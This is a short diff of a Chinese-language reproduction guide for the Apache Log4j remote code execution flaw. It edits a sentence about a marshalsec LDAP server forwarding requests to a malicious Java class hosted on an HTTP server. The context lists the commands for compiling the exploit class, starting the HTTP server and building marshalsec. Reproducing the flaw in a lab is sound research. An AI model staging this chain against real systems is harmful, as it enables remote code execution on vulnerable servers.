@@ -11,7 +11,7 @@ Apache Log4j 远程代码执行
    2. 编译 `javac Log4jRCE.java`
    3. 启动http server，python或php均可快速启动，如`php -S 0.0.0.0:8888`
 
-2. 使用marshalsec的ldap server，访问这个ldap server内的任意资源都会被自动转发到http server的固定资源，这里即恶意java类文件
+2. 使用marshalsec的ldap server，访问这个ldap server内的任意资源都会被自动转发到http server的固定资源，这里需要转发到http server中的恶意java类文件
    1. `git clone https://github.com/mbechler/marshalsec.git`
    2. `cd marshalsec`
    3. `mvn clean package -DskipTests`
